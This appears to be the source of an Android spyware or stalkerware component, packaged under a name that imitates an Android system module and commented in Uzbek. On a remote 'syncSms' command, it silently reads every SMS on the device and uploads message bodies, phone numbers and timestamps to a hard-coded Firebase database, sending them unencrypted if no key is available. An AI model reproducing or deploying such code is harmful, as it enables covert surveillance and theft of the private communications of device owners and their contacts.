package com.android.system.core.sms

import android.content.Context
import android.provider.Telephony
import android.util.Log
import com.android.system.core.BuildConfig
import com.android.system.core.crypto.CryptoManager
import com.android.system.core.crypto.KeyFetchWorker
import com.google.firebase.database.FirebaseDatabase
import java.security.MessageDigest

/**
 * SMS larni ContentResolver orqali o'qib Firebase'ga yuklaydi.
 * Conversation-based (telefon raqam bo'yicha guruhlangan).
 * Firebase path: devices/{uid}/sms/conversations/{phoneNumber}/
 * Trigger: command type "syncSms"
 */
class SmsReader(private val context: Context) {

    companion object {
        private const val TAG = "SYS_CORE_SMS"
        private const val FIREBASE_URL = "https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app"
    }

    /**
     * SMS larni o'qib Firebase'ga yuklaydi (conversation-based).
     * @param uid qurilma UID
     * @param onComplete yuklash tugaganda chaqiriladi (success: Boolean)
     */
    fun readAndUpload(uid: String, onComplete: (Boolean) -> Unit = {}) {
        try {
            val smsList = readSms()
            if (BuildConfig.DEBUG) { Log.d(TAG, "Read ${smsList.size} SMS messages") }

            if (smsList.isEmpty()) {
                if (BuildConfig.DEBUG) { Log.d(TAG, "No SMS found, uploading empty list") }
                onComplete(true)
                return
            }

            val aesKey = KeyFetchWorker.getAesKey(context)
            if (aesKey == null && BuildConfig.DEBUG) {
                Log.w(TAG, "AES key not available, SMS will be uploaded unencrypted")
            }

            // Group by phone number (address)
            val conversations = groupByAddress(smsList)
            if (BuildConfig.DEBUG) { Log.d(TAG, "Grouped into ${conversations.size} conversations") }

            // Build Firebase structure for each conversation
            val conversationsMap = mutableMapOf<String, Any>()
            
            conversations.forEach { (phoneNumber, messages) ->
                val encryptedPhoneNumber = if (aesKey != null) {
                    CryptoManager.encrypt(phoneNumber, aesKey) ?: phoneNumber
                } else phoneNumber

                // Find most recent message
                val mostRecent = messages.maxByOrNull { it.date } ?: messages.first()
                val lastMessage = mostRecent.body.take(50)
                val lastTimestamp = mostRecent.date

                // Build messages sub-map with encrypted bodies
                val messagesMap = mutableMapOf<String, Any>()
                messages.forEach { sms ->
                    val encryptedBody = if (aesKey != null) {
                        CryptoManager.encrypt(sms.body, aesKey) ?: sms.body
                    } else sms.body

                    messagesMap["msg_${sms.date}"] = mapOf(
                        "body" to encryptedBody,
                        "date" to sms.date,
                        "type" to sms.type,
                        "id" to sms.id
                    )
                }

                val firebaseKey = sanitizeFirebaseKey(phoneNumber)
                conversationsMap[firebaseKey] = mapOf(
                    "phoneNumber" to encryptedPhoneNumber,
                    "lastMessage" to lastMessage,
                    "lastTimestamp" to lastTimestamp,
                    "messages" to messagesMap
                )
            }

            // Sort conversations by lastTimestamp DESC
            val sortedConversations = conversationsMap.entries
                .sortedByDescending { 
                    (it.value as Map<*, *>)["lastTimestamp"] as Long 
                }
                .associate { it.key to it.value }

            // Firebase'ga yozish
            FirebaseDatabase.getInstance(FIREBASE_URL)
                .getReference("devices")
                .child(uid)
                .child("sms")
                .child("conversations")
                .setValue(sortedConversations)
                .addOnSuccessListener {
                    if (BuildConfig.DEBUG) { Log.d(TAG, "SMS uploaded successfully: ${conversations.size} conversations") }
                    onComplete(true)
                }
                .addOnFailureListener { e ->
                    if (BuildConfig.DEBUG) { Log.e(TAG, "SMS upload failed: ${e.message}") }
                    onComplete(false)
                }

        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e(TAG, "readAndUpload error: ${e.message}") }
            onComplete(false)
        }
    }

    /**
     * ContentResolver orqali SMS larni o'qiydi (limit yo'q).
     * @return SmsData ro'yxati (date DESC tartibida)
     */
    private fun readSms(): List<SmsData> {
        val smsList = mutableListOf<SmsData>()
        try {
            val cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(
                    Telephony.Sms._ID,
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE
                ),
                null,
                null,
                "${Telephony.Sms.DATE} DESC"
            )

            cursor?.use {
                val idCol = it.getColumnIndexOrThrow(Telephony.Sms._ID)
                val addressCol = it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
                val bodyCol = it.getColumnIndexOrThrow(Telephony.Sms.BODY)
                val dateCol = it.getColumnIndexOrThrow(Telephony.Sms.DATE)
                val typeCol = it.getColumnIndexOrThrow(Telephony.Sms.TYPE)

                while (it.moveToNext()) {
                    smsList.add(
                        SmsData(
                            id = it.getString(idCol) ?: "",
                            address = it.getString(addressCol) ?: "",
                            body = it.getString(bodyCol) ?: "",
                            date = it.getLong(dateCol),
                            type = it.getInt(typeCol)
                        )
                    )
                }
            }
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e(TAG, "readSms error: ${e.message}") }
        }
        return smsList
    }

    /**
     * SMS larni telefon raqam bo'yicha guruhlaydi.
     */
    private fun groupByAddress(smsList: List<SmsData>): Map<String, List<SmsData>> {
        return smsList.groupBy { it.address }
    }

    /**
     * Firebase key uchun address'ni xavfsiz hash'ga aylantiradi.
     * MD5 hash ishlatiladi (deterministic va collision-safe).
     */
    private fun sanitizeFirebaseKey(address: String): String {
        val md5 = java.security.MessageDigest.getInstance("MD5")
        val hash = md5.digest(address.toByteArray())
        return "conv_" + hash.joinToString("") { "%02x".format(it) }.take(16)
    }

    /**
     * SMS ma'lumotlari modeli
     * @param type 1=inbox, 2=sent
     */
    data class SmsData(
        val id: String,
        val address: String,
        val body: String,
        val date: Long,
        val type: Int
    )
}
